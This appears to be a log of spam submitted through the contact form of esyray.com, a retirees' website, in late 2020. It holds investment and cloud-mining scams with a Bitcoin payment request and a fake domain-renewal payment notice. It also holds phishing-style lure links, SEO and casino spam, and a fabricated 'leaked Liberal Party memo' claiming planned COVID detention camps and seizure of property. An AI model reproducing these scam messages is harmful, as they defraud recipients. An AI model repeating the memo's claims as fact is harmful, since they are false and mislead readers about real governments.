+++ 2020-10-25 01:30:03 AM -- Email from: PASSIVES EINKOMMEN VOR 3075 EUR IN DER WOCHE - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN: http://asq.kr/ChZshDlGXpcE, -- subject: PASSIVES EINKOMMEN IM INTERNET VOR 7076 EURO PRO TAG - GONNEN SIE SICH FINANZIELLE FREIHEIT: https://darknesstr.com/3dz8f, -- email: yankee6243@att.net, -- Message is: ONLINE VERDIENEN VON 4845 EUR IN DER WOCHE - KEINE BERUFLICHEN FAHIGKEITEN: https://jtbtigers.com/3e2ti
+++ 2020-10-25 07:08:39 AM -- Email from: Katherine Mitford, -- subject: mitford.katherine@gmail.com, -- email: mitford.katherine@gmail.com, -- Message is: Sick of wasting money on PPC advertising that just doesn't deliver? Now you can post your ad on 1000s of advertising websites and it'll cost you less than $40. Never pay for traffic again! 

To get more info take a look at: http://bit.ly/no-cost-web-traffic
+++ 2020-10-27 04:42:18 PM -- Email from: HaroldKnith, -- subject: Invest $ 15,000 in affiliate marketing and get $ 45,000 in a month, -- email: laura1314@hotmail.com, -- Message is: Invest $ 15,000 in affiliate marketing and get $ 45,000 in a month 
Hey. 
Yes, you heard right. 
You don't have to do anything. 
We will do all the work for you. 
You only need to invest and wait one month to receive payments. 
https://blockchain.com/btc/payment_request?address=18gaWYjABVFJ9PhG1hCqjh5FjWBrkQVuwD&amp;amount=1.14&amp;message=invest_in_affiliate_marketing_at_300%_per_month 
We have been engaged in affiliate marketing for many years and decided to attract investments to work in the development of three more areas of our activity. 
 
You can only invest one amount because this is the best option for earning super profits in affiliate marketing. 
We give a 100% guarantee that you will receive your profit on time. 
https://blockchain.com/btc/payment_request?address=18gaWYjABVFJ9PhG1hCqjh5FjWBrkQVuwD&amp;amount=1.14&amp;message=invest_in_affiliate_marketing_at_300%_per_month 
After you make an investment by clicking on the link, exactly in a month your profit in the amount of 300% will be returned to your wallet from which you made the transfer to our system. 
 
The payment is made in one time. 
If you want to receive such a profit every month, then you need to invest every month. 
https://blockchain.com/btc/payment_request?address=18gaWYjABVFJ9PhG1hCqjh5FjWBrkQVuwD&amp;amount=1.14&amp;message=invest_in_affiliate_marketing_at_300%_per_month 
There are almost two months left before the New Year, during which time you will have time to invest twice and get $ 75,000 in net profit.
+++ 2020-10-29 07:36:57 AM -- Email from: Jerrell Schaaf, -- subject: , -- email: jerrell.schaaf@gmail.com, -- Message is: Find out how to promote your website at zero cost!

Have a quick gander at this complete directory made up of the most popular free ad sites here &gt;http://bit.ly/list-of-free-ad-websites
+++ 2020-10-29 11:41:14 AM -- Email from: JoshuaBrupe, -- subject: PASSIVES EINKOMMEN ONLINE VOR 7768 EUR AM TAG - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG: https://3526589euro.page.link/RuHp8gpbiL9Rb7aR7, -- email: ger_bozz@yahoo.de, -- Message is: PASSIVES EINKOMMEN IM INTERNET VON 8967 EUR PRO TAG - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN: https://28569euro.page.link/sfq8kDA96bqQv2rYA
+++ 2020-10-30 11:58:39 PM -- Email from: EINNAHMEN IM INTERNET VOR 3866 EURO PRO TAG - DIE BESTE SEITE, UM ONLINE GELD ZU VERDIENEN: https://8569euro.page.link/h5PX6hdphpvvGLHx5, -- subject: PASSIVES EINKOMMEN IM INTERNET VON 3056 EURO PRO TAG - GONNEN SIE SICH FINANZIELLE FREIHEIT: https://8523658euro.page.link/AZeS3hBSHFTkoGW36, -- email: stubzies@gmail.com, -- Message is: PASSIVES EINKOMMEN IM INTERNET VON 5068 EURO IN DER WOCHE - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG: https://2539euro.page.link/W3wv1y7a8e61ApCT8
+++ 2020-11-01 07:10:09 PM -- Email from: EINNAHMEN IM INTERNET VOR 8747 EURO AM TAG - DIE BESTE SEITE, UM ONLINE GELD ZU VERDIENEN: https://4586euro.page.link/yAbpSEcJ2b8CiRcSA, -- subject: EINNAHMEN IM INTERNET VON 4746 EURO PRO TAG - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN: https://856253euro.page.link/RRLt8KtkV4tpC5Mz5, -- email: irenecandido@yahoo.com, -- Message is: EINNAHMEN IM INTERNET VOR 7848 EURO AM TAG - DIE BESTE INVESTITIONSMOGLICHKEIT: https://2539euro.page.link/XM8QMPbp9fycG3icA
+++ 2020-11-02 08:14:05 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.top, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.top/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Ritter
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.top/out.php?site=esyray.com
+++ 2020-11-03 05:24:33 AM -- Email from: Eric Jones, -- subject: Who needs eyeballs, you need BUSINESS, -- email: eric@talkwithwebvisitor.com, -- Message is: My name’s Eric and I just came across your website - esyray.com - in the search results.

Here’s what that means to me…

Your SEO’s working.

You’re getting eyeballs – mine at least.

Your content’s pretty good, wouldn’t change a thing.

BUT…

Eyeballs don’t pay the bills.

CUSTOMERS do.

And studies show that 7 out of 10 visitors to a site like esyray.com will drop by, take a gander, and then head for the hills without doing anything else.

It’s like they never were even there.

You can fix this.

You can make it super-simple for them to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket… thanks to Talk With Web Visitor.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know immediately – so you can talk to that lead immediately… without delay… BEFORE they head for those hills.
  
CLICK HERE http://www.talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Now it’s also true that when reaching out to hot leads, you MUST act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s what makes our new SMS Text With Lead feature so powerful… you’ve got their phone number, so now you can start a text message (SMS) conversation with them… so even if they don’t take you up on your offer right away, you continue to text them new offers, new content, and new reasons to do business with you.

This could change everything for you and your business.

CLICK HERE http://www.talkwithcustomer.com to learn more about everything Talk With Web Visitor can do and start turing eyeballs into money.

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Paying customers are out there waiting. 
Starting connecting today by CLICKING HERE http://www.talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2020-11-03 06:49:30 AM -- Email from: Hagedorn, -- subject: Die Geschäftsnr.    HL  24-850., -- email: micki.kavanagh@hotmail.com, -- Message is: Hochwertige Waren vom Produzent.   Fabrikverkauf.   Versand am gleichen Tag.    Bis 95 % günstiger als auf dem Markt.


Müllsäcke Alle,     Sandsäcke,     Raschelsäcke,     Spänesäcke,

Kartonage,     Luftpolstertaschen,     Maxibrief,                    

Abdeckplane,     Abdeckfolie,     Baufolie,

Alufolie - Frischhaltefolie,     Alu Klebeband - Aluband,

Abklebeband,     Malerkrepp,     Klebeband mit Folie,     Malerkrepp mit Folie,

Antirutsch Streifen,    Klebebänder Alle,     Gewebeband,     Papierklebeband,       

Ddoppelseitiges Klebeband,   Schaumklebeband,     Reflektorband, 	Absperrband,
	
Kantenschutz,     Kantenschutzprofil,     Abdeckhaube,     Palettenhaube,

Reifentüten,     Umzugsdecken,     Möbeldecken,

Alles für Umreifung,     Umreifungsband,     Haspelspanner,     Klemmen,

Stretchfolie,     Handstretchfolie,     Maschinenstretchfolie

Unkrautvlies,     Malervlies,     Renoviervlies,

Luftpolsterfolie,     Alu Luftpolsterfolie,     Schaumfolie,     Alu Schaumfolie,

Sichtschutz,     Sonnenschutz,     Windschutz,

Glasschutzfolie,     Fensterschutzfolie,

Katzenstreu alle Sorten,      Arbeitshandschuhe und    Vieles mehr



 auf:   http://www.follmex.site
+++ 2020-11-03 09:54:48 AM -- Email from: LonnieCricy, -- subject: Passive income of $ 2400 per day on cloud mining, -- email: dimitri84@hotmail.com, -- Message is: Hey. 
 
I have more than $ 15,000 passive income per week on cloud mining 
 
I only invested once and now my passive income is about $ 2400 per day http://asq.kr/EJ1cbahecoGlL 
 
Payments to my wallet come every day https://jtbtigers.com/3kb8a 
 
If interested, you can also start making money this way https://jtbtigers.com/3keih 
 
The number of cloud miners is limited, hurry up to take the right step to success https://links.wtf/Cm9r
+++ 2020-11-04 07:22:49 PM -- Email from: EARNING ONLINE FROM 3657 EUR IN A DAY - IN A MONTH YOU CAN BUY YOURSELF AN EXPENSIVE APARTMENT: https://onlineuniversalwork.com/3nru7, -- subject: PASSIVE INCOME BEFORE 5834 EUR IN A DAY - IN A MONTH, YOU CAN SAFELY QUIT YOUR JOB: https://qspark.me/Vhp8dW, -- email: mijcs@hotmail.com, -- Message is: EARNINGS ON THE INTERNET FROM 4345 EUR IN A DAY - IN A MONTH YOU CAN BUY YOURSELF AN EXPENSIVE APARTMENT: http://xsle.net/3mfmv
+++ 2020-11-05 10:10:21 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@newalexabusinessdirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://newalexabusinessdirectory.top/abcc1/?=esyray.com


 

 
Francis















 
1 7 1 Passaic str eet, Garf eld NJ 0 7 0 2 6

You can skip future marketing messages here:
https://newalexabusinessdirectory.top/out.php?site=esyray.com
+++ 2020-11-06 09:12:28 AM -- Email from: PASSIVE INCOME ONLINE BEFORE 9859 GBP PER DAY - WITHIN A WEEK YOU WILL BE FINANCIALLY INDEPENDENT: https://onlineuniversalwork.com/3nrrq, -- subject: EARNING ONLINE FROM 7435 EUR IN WEEK - WITHIN A WEEK YOU WILL BE FINANCIALLY INDEPENDENT: https://qspark.me/gmsLJi, -- email: music_mad24601@hotmail.co.uk, -- Message is: PASSIVE INCOME ON THE INTERNET FROM 6534 EUR IN WEEK - IN A MONTH, YOU CAN SAFELY QUIT YOUR JOB: http://asq.kr/PsJNOi77zJhxo
+++ 2020-11-06 03:50:56 PM -- Email from: Alexis Ordell, -- subject: Siphon free buyer traffic using this ‘one-link’ system, -- email: ordell.alexis@gmail.com, -- Message is: Trafficize is the brand new software that siphons free buyer traffic using only ONE LINK.

The creators of this product, found an easy way to get over 4,833 clicks, in the span of 30 days...making them $14,738 in net profits just from ONE simple campaign...

All they needed to do was just to paste this traffic ‘link’ into their websites and social platforms and they started seeing amazing autopilot income.
==&gt;&gt;&gt; https://geekboy.co/trafficize/

It’s not too shabby considering all they needed to do was copy and paste a simple link…

The best part about this is you will have other people do all the hard work - while your traffic ‘link’ keeps bringing in buyers traffic for you on complete autopilot.

Anyone - including YOU can do this. 

No product required
No technical skills required
No further investment
==&gt;&gt;&gt; https://geekboy.co/trafficize/

I installed this ONE link onto my sites...

And because of that, I’m making more money on my campaigns and get way more leads than ever before.

You can do the same - BUT HURRY, Trafficize is only available at a one-time fee during the launch.

Avoid paying monthly fees, and get Trafficize and my bonuses by acting now
==&gt;&gt;&gt; https://geekboy.co/trafficize/


Best wishes,
GeekBoy Team



P.S: remember, even if you decide to cancel for any reason, I will let you keep all my bonuses so there is no risk in signing up to try this out.




Unsubscribe Here &gt;&gt; https://geekboy.co/unsubscribe
+++ 2020-11-06 10:13:39 PM -- Email from: Santiago Fairthorne, -- subject: Leaked Email From Liberal Party of Canada Lays Out The Plan, Very Concerning., -- email: santiago.fairthorne@hotmail.com, -- Message is: w: LPC Strategic Committee LeakInboxLPC leaker &lt;‪LPC_leaker@protonmail.com‬&gt;1:47 PM (7 hours ago)toHello,

Original Message ‐‐‐‐‐‐‐ On Saturday, October 10, 2020 1:38 PM, REMOVED &lt;REMOVED&gt; wrote:

Dear *******,

I want to provide you some very important information. I'm a committee member within the Liberal Party of Canada. I sit within several committee groups but the information I am providing is originating from the Strategic Planning committee (which is steered by the PMO).

I need to start off by saying that I'm not happy doing this but I have to. As a Canadian and more importantly as a parent who wants a better future not only for my children but for other children as well. The other reason I am doing this is because roughly 30% of the committee members are not pleased with the direction this will take Canada, but our opinions have been ignored and they plan on moving forward toward their goals. They have also made it very clear that nothing will stop the planned outcomes.

The road map and aim was set out by the PMO and is as follows:

Phase in secondary lock down restrictions on a rolling basis, starting with major metropolitan areas first and expanding outward. Expected by November 2020.

Rush the acquisition of (or construction of) isolation facilities across every province and territory. Expected by December 2020.

Daily new cases of COVID-19 will surge beyond capacity of testing, including increases in COVID related deaths following the same growth curves. Expected by end of November 2020.

Complete and total secondary lock down (much stricter than the first and second rolling phase restrictions). Expected by end of December 2020 - early January 2021

Reform and expansion of the unemployment program to be transitioned into the universal basic income program. Expected by Q1 2021.

Projected COVID-19 mutation and/or co-infection with secondary virus (referred to as COVID-21) leading to a third wave with much higher mortality rate and higher rate of infection. Expected by February 2021.

Daily new cases of COVID-21 hospitalizations and COVID-19 and COVID-21 related deaths will exceed medical care facilities capacity. Expected Q1 - Q2 2021.

Enhanced lock down restrictions (referred to as Third Lock Down) will be implemented. Full travel restrictions will be imposed (including inter-province and inter-city). Expected Q2 2021.

Transitioning of individuals into the universal basic income program. Expected mid Q2 2021.

Projected supply chain break downs, inventory shortages, large economic instability. Expected late Q2 2021.

Deployment of military personnel into major metropolitan areas as well as all major roadways to establish travel checkpoints. Restrict travel and movement. Provide logistical support to the area. Expected by Q3 2021.

Along with that provided road map the Strategic Planning committee was asked to design an effective way of transitioning Canadians to meet a unprecedented economic endeavor. One that would change the face of Canada and forever alter the lives of Canadians.

What we were told was that in order to offset what was essentially an economic collapse on a international scale, that the federal government was going to offer Canadians a total debt relief.

This is how it works: the federal government will offer to eliminate all personal debts (mortgages, loans, credit cards, etc) which all funding will be provided to Canada by the IMF under what will become known as the World Debt Reset program.

In exchange for acceptance of this total debt forgiveness the individual would forfeit ownership of any and all property and assets forever.

The individual would also have to agree to partake in the COVID-19 and COVID-21 vaccination schedule, which would provide the individual with unrestricted travel and unrestricted living even under a full lock down (through the use of photo identification referred to as Canada's HealthPass) .

Committee members asked who would become the owner of the forfeited property and assets in that scenario and what would happen to lenders or financial institutions, we were simply told &quot;the World Debt Reset program will handle all of the details&quot;.

Several committee members also questioned what would happen to individuals if they refused to participate in the World Debt Reset program, or the HealthPass, or the vaccination schedule, and the answer we got was very troubling. Essentially we were told it was our duty to make sure we came up with a plan to ensure that would never happen. We were told it was in the individuals best interest to participate.

When several committee members pushed relentlessly to get an answer we were told that those who refused would first live under the lock down restrictions indefinitely.

And that over a short period of time as more Canadians transitioned into the debt forgiveness program, the ones who refused to participate would be deemed a public safety risk and would be relocated into isolation facilities. Once in those facilities they would be given two options, participate in the debt forgiveness program and be released, or stay indefinitely in the isolation facility under the classification of a serious public health risk and have all their assets seized.

So as you can imagine after hearing all of this it turned into quite the heated discussion and escalated beyond anything I've ever witnessed before.

In the end it was implied by the PMO that the whole agenda will move forward no matter who agrees with it or not.

That it wont just be Canada but in fact all nations will have similar roadmaps and agendas. That we need to take advantage of the situations before us to promote change on a grander scale for the betterment of everyone. The members who were opposed and ones who brought up key issues that would arise from such a thing were completely ignored. Our opinions and concerns were ignored. We were simply told to just do it.

All I know is that I don't like it and I think its going to place Canadians into a dark future.

Full Link: https://thecanadianreport.ca/is-this-leaked-memo-really-trudeaus-covid-plan-for-2021-you-decide/

Alternate Link: https://www.godlikeproductions.com/forum1/message4551385/pg1?c1=1&amp;c2=1&amp;disclaimer=Continue

Youtube Link based on email leak: Questions: What's Going On??? https://youtu.be/AzWLlfwfD4Y

Canadian Government construction contract page to bid on building COVID &quot;isolation&quot; camps: http://web-old.archive.org/web/20201022044041/https://buyandsell.gc.ca/procurement-data/tender-notice/PW-ZL-105-38463

Gov of Canada Announces Funding for voluntary self-isolation centre in Toronto: https://www.canada.ca/en/public-health/news/2020/09/government-of-canada-announces-funding-for-new-voluntary-self-isolation-centre-in-toronto.html

Justin Trudeau's COVID-19 detention centres: What you need to know : https://youtu.be/u6I69M1iTKo

Jesus Christ Is Coming Back Soon So Repent of sin, pray, and have faith in Jesus Christ!

https://www.facebook.com/groups/38928... (Join Our Pre-Tribulation Rapture Group)

Pray this prayer sincerely to know your saved 
Jesus, I believe you came to earth, I believe you died on the Cross for my sins. I believe you rose again on the 3rd day and went back to Heaven to prepare a place for Your Children To live with You Forever . Please forgive me of my sins. Clean my heart, white as snow. Come live in my heart, make me a child of the King, a new creature in Christ, in your precious Name I ask this...amen. 
　
Do these things after praying the Salvation Prayer: 
　
1) Get a King James Version Bible and read it daily, it will feed your spirit and soul, the way you feed your body with food and water. 
　
2) Pray to Jesus Everyday. He is your NEW Best Friend and He Wants to Talk with you daily. 
　
3) Make sure you find a christian church and get water Baptized, dunked under water, if you have been sprinkle baptized in the past it does NOT count. 
　
4) Pray to be filled with the Holy Spirit, &quot;Sanctified&quot;. You do this by praying, reading the Bible and living for Jesus. 
　
5) take your King James Bible to church. When the preacher speaks, make sure what he says matches your Bible, it not, get up and walk out and find a new church. 
　
6) ***VERY IMPORTANT*** Make SURE you REPENT of EVERY SIN you do now, ask Jesus to forgive you with an honest heart and He will. 
***If you would like me to pray with you or for you for ANYTHING, please message me and I will add you to my daily prayer list. May God bless you!
+++ 2020-11-06 11:50:57 PM -- Email from: Anton Finnerty, -- subject: I found it., -- email: finnerty.anton@outlook.com, -- Message is: Good evening people at %domain,
This is the email lists I was looking for, they have millions of emails you can contact to get new clients https://b2bworld.store/email-lists
Good luck!
+++ 2020-11-07 08:30:04 AM -- Email from: Marsha Hennessey, -- subject: RE: esyray.com, -- email: esyray.com@esyray.com, -- Message is: RE: esyray.com / E-Systems/Raytheon Garland Retirees INTERNET SITE SERVICES
This notification EXPIRES ON: Nov 07, 2020


We have not gotten a payment from you.
We've tried to email you however were unable to reach you.


Please Check Out: https://saveonyourdomain.com/?web=esyray.com

For info and to make a discretionary settlement for solutions.

Thank you.

11072020032932536356456
+++ 2020-11-07 07:59:18 PM -- Email from: FelixHow, -- subject: I will build perfect backlinks SEO service quality dofollow links high da, -- email: ondieky@msn.com, -- Message is: I will do 961 DA 65-96 SEO Links for Top rankings on Google 2021. 
 
Tier 1 - 31 SEO links DA 75-96 
 
Tier 2 - 930 SEO links DA 75-96 
 
These links are really effective for Page 1 rankings and Top 3 Positions and all are Google Compliant. 
 
http://xsle.net/3ocp0 
 
Panda Penguin Hummingbird Safe 
 
Improves the Metrics of your Website like Trust flow and Citations 
 
Enables your Website to rank for any top Keywords 
 
Proven Results, worked well for 100+ Websites tested this year. 
 
https://qspark.me/GKsnG9 
 
+ High quality backlinks 
+ Safe on latest algorithm (2020 updated) 
+ Full reports (.txt) 
+ White hat and Extremely Safe method 
+ According to latest google updated 2020 
+ Google Loves the High DA Bcklinks 
+ 100% Google Safe 
+ Full Verified Backlinks 
+ Rankings and Get More Authority 
 
https://ecuadortenisclub.com/3n495
+++ 2020-11-09 09:41:29 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-11-09 09:48:01 AM -- Email from: JoshuaBrupe, -- subject: PASSIVES EINKOMMEN VOR 8978 EUR PRO TAG - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG: https://2539euro.page.link/pnRBDaPDdmuVkYgG7, -- email: M.Erdmann81@gmx.de, -- Message is: ONLINE VERDIENEN VON 8957 EUR PRO TAG - KEINE BERUFSERFAHRUNG: https://352658euro.page.link/7SSSsMfqRh19nAEQ9
+++ 2020-11-09 10:45:04 AM -- Email from: Jan Leff, -- subject: , -- email: leff.jan@gmail.com, -- Message is: Good morning, I was just checking out your site and submitted this message via your contact form. The feedback page on your site sends you messages like this via email which is why you're reading my message right now correct? This is half the battle with any kind of online ad, getting people to actually READ your message and that's exactly what I just accomplished with you! If you have an ad message you would like to blast out to tons of websites via their contact forms in the US or to any country worldwide send me a quick note now, I can even focus on particular niches and my charges are very low. Send a message to: erwanleroux9138@gmail.com

cease these ad messages https://bit.ly/2xN75Pz
+++ 2020-11-09 02:50:10 PM -- Email from: James Fitzgerald, -- subject: cheap monthly SEO plans, -- email: no-reply@google.com, -- Message is: Gооd dаy! 
I have just checked esyray.com for the ranking keywords and seen that your SEO metrics could use a boost. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
regards 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2020-11-09 05:59:24 PM -- Email from: Angelia Doi, -- subject: YOU NEED QUALITY VISITORS FOR YOUR: esyray.com, -- email: angelia.doi@gmail.com, -- Message is: YOU NEED QUALITY VISITORS FOR YOUR: esyray.com
 
WE PROVIDE ORGANIC TRAFFIC BY KEYWORD FROM SEARCH ENGINES OR SOCIAL MEDIA
 
YOU GET HIGH-QUALITY VISITORS
  -  visitors from search engines
  -  visitors from social media
  -  visitors from any country you want
 
CLAIM YOUR 24 HOURS FREE TEST =&gt; http://bit.ly/GetTrafficSmart
+++ 2020-11-10 12:53:40 AM -- Email from: Staci Petersen, -- subject: Hi, -- email: staci.petersen@yahoo.com, -- Message is: Hello

I have a question, i see a lot of products in this shop, https://screenshot.photos/cheaperitemsinshop, that you also sell. But there items are 44% cheaper, well my question is what is the difference between your items, is it the quality or something else, i hope you can help me!

Yours truly
Staci Petersen

&quot;Sent from my Mobile device&quot;
+++ 2020-11-10 06:36:26 AM -- Email from: Krystal Beaudry, -- subject: Newbie made 5 sales within 24 hours, -- email: krystal.beaudry81@outlook.com, -- Message is: YES!

Not just 5 sales…

These were his FIRST ever sales

How did he do it?

Well…

He simply implemented a 100% proven system by Philip and Dan

The best part is…

HE SAID IT’S AS PUSH BUTTON AS IT GETS

If you want to start making sales and start making them FAST

Click here to start making sales now

==&gt;&gt; https://geekboy.co/instant-sales-berzerker/

Best wishes,
GeekBoy Team



Unsubscribe Here &gt;&gt; https://geekboy.co/unsubscribe
+++ 2020-11-10 03:07:58 PM -- Email from: OliverFal, -- subject: Как перевести Киевстар на карту, -- email: artemka.nikiforov.92@mail.ru, -- Message is: Снимайте деньги с Киевстара на карточку 
 
&lt;a href=https://mobi-dengi.com/kievstar-dengi.html&gt;Мобильные деньги&lt;/a&gt;
+++ 2020-11-10 10:27:52 PM -- Email from: Claudfub, -- subject: PASSIVES EINKOMMEN IM INTERNET VOR 3968 EURO AM TAG - KEINE BERUFLICHEN FAHIGKEITEN, -- email: cvandewalle@hotmail.fr, -- Message is: PASSIVES EINKOMMEN IM INTERNET VOR 3056 EURO IN DER WOCHE - INNERHALB EINER WOCHE SIND SIE FINANZIELL UNABHANGIG: https://28569euro.page.link/kq9a6w3Sk8uikxpg6
+++ 2020-11-11 07:06:01 AM -- Email from: DiksFag, -- subject: Новый рейтинг казино New online casino rating, -- email: fah.igor@yandex.ru, -- Message is: https://jakjon.com/
 
Новый рейтинг казино онлайн с быстрой моментальной выплатой и супер большой отдачей. 
https://jakjon.com/
 
New online casino rating with fast instant payouts and super big returns.
+++ 2020-11-12 10:19:37 AM -- Email from: PASSIVES EINKOMMEN ONLINE VOR 6857 EURO IN DER WOCHE - IN EINEM MONAT KONNEN SIE SICH EIN TEURES AUTO KAUFEN: https://3526589euro.page.link/bnA3p3PPCxPoM9gcA, -- subject: ONLINE VERDIENEN VON 9758 EUR PRO TAG - GONNEN SIE SICH FINANZIELLE FREIHEIT: https://856253euro.page.link/Yy81NUAhRBQGfW436, -- email: Zt11v123@live.co.uk, -- Message is: ONLINE VERDIENEN VOR 5965 EUR PRO TAG - DIE BESTE INVESTITIONSMOGLICHKEIT: https://6523euro.page.link/BKVsJuG3i8BQtraR6
+++ 2020-11-13 05:43:20 AM -- Email from: Garfield Sears, -- subject: CBD Dropshipping Program, -- email: garfield.sears@gmail.com, -- Message is: Hello

I am writing to learn if you want to grow your business activity beyond esyray.com.

JustCBD Dropship Program will make it possible for you to start up your very own Shopify CBD store and begin selling the most popular CBD items without holding any stock or making any significant investments. With the Covid-19 pandemic individuals are becoming health conscious and the sale of CBD items and various other nutraceuticals is growing at lightning fasts speeds. This represents a tremendous business opportunity for anybody who is serious about making real money. With JustCBD Dropship Program, you can be operating your very own CBD store in basically no time. Our dropship program has become tremendously popular during the coronavirus pandemic as more and more individuals are establishing their own on-line businesses with us.

You will have no doubt come across CBD products on-line, in your local shop or via anecdotal evidence from your pals. CBD can be found in many different shapes including gummies, oil, salves, capsules, pet treats, vapes, etc. CBD goods have a very broad appeal as they can help essentially anyone: from children and senior people to your beloved pets.

JustCBD has been featured in over 500 US media outlets. Here is what one of them has to say about us: http://stockquotes.stockenews.com/stockenews/news/read/40466793/demand_for_just_cbd80%99s_vegan

Do not take our word for it and give the JustCBD Dropshipping Program a go!

For more information and enroll with the JustCBD Shopify Dropship Program, visit https://justcbdstore.com/justcbd-shopify-dropship-program/.

We look forward to seeing you on-board.

Warm Regards.
+++ 2020-11-13 06:52:52 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@newalexabusinessdirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://newalexabusinessdirectory.top/abcc1/?=esyray.com


 

 
Francis















 
1 7 1 Passaic str eet, Garf eld NJ 0 7 0 2 6

You can skip future marketing messages here:
https://newalexabusinessdirectory.top/out.php?site=esyray.com
+++ 2020-11-13 07:05:59 PM -- Email from: JoshuaBrupe, -- subject: Hey hРµiГџer Kerl! IСЃh mГ¶СЃhtРµ, dass du miСЃh in Р°llРµ LГ¶СЃhРµr fickst: https://ecuadortenisclub.com/3m2p3, -- email: schiebe_2000@web.de, -- Message is: РќallРѕ Рњacho! IСЃh mГ¶СЃhte wirklich, dР°ss du miСЃh in allРµ LГ¶chРµr fickst: https://qspark.me/Bz14nU
+++ 2020-11-14 03:35:39 AM -- Email from: Hayley Mae, -- subject: &gt;&gt;&gt;&gt; BlackFriday - Top 20 Gadgets for 2020 &lt;&lt;&lt;&lt; 50% OFF Mega Sale :), -- email: hayley@workplacegenius.com, -- Message is: Hi

Check out the top 20 Tech Gadgets for 2020 

Mega 50% OFF BlackFriday sale 

For Drones to Watches to LED portable Keyboards!

The Best gadets &amp; Biggest Blackfriday discounts are here

&gt;&gt;&gt; https://wp-genius.com/blackfridaydeals &lt;&lt;&lt;

Grab an insane bargin now &amp; Keep safe 

Hayley Mae
x
+++ 2020-11-16 10:33:30 AM -- Email from: Eric Jones, -- subject: Who needs eyeballs, you need BUSINESS, -- email: ericjonesonline@outlook.com, -- Message is: My name’s Eric and I just came across your website - esyray.com - in the search results.

Here’s what that means to me…

Your SEO’s working.

You’re getting eyeballs – mine at least.

Your content’s pretty good, wouldn’t change a thing.

BUT…

Eyeballs don’t pay the bills.

CUSTOMERS do.

And studies show that 7 out of 10 visitors to a site like esyray.com will drop by, take a gander, and then head for the hills without doing anything else.

It’s like they never were even there.

You can fix this.

You can make it super-simple for them to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket… thanks to Talk With Web Visitor.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know immediately – so you can talk to that lead immediately… without delay… BEFORE they head for those hills.
  
CLICK HERE http://www.talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Now it’s also true that when reaching out to hot leads, you MUST act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s what makes our new SMS Text With Lead feature so powerful… you’ve got their phone number, so now you can start a text message (SMS) conversation with them… so even if they don’t take you up on your offer right away, you continue to text them new offers, new content, and new reasons to do business with you.

This could change everything for you and your business.

CLICK HERE http://www.talkwithwebvisitors.com to learn more about everything Talk With Web Visitor can do and start turing eyeballs into money.

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Paying customers are out there waiting. 
Starting connecting today by CLICKING HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2020-11-17 03:43:53 PM -- Email from: Andyzoj, -- subject: chnlove real or fake, -- email: xrumer888@outlook.com, -- Message is: specialist around Tumblr

Sanders sidesjanus sandersflowersthank &lt;a href=https://issuu.com/chnlovepage&gt;chnlove scam&lt;/a&gt; youspecialdtiysi guessthis may new in everything can evoke for a lifetime regarding something okay happensyou don will need engage nonetheless, if you wanttag me!thanks for your time againsorry haha

shoes you're residence using

I it lucky a questioned on the I proved to be succumbing continuing to keep this kind of that would me personally!

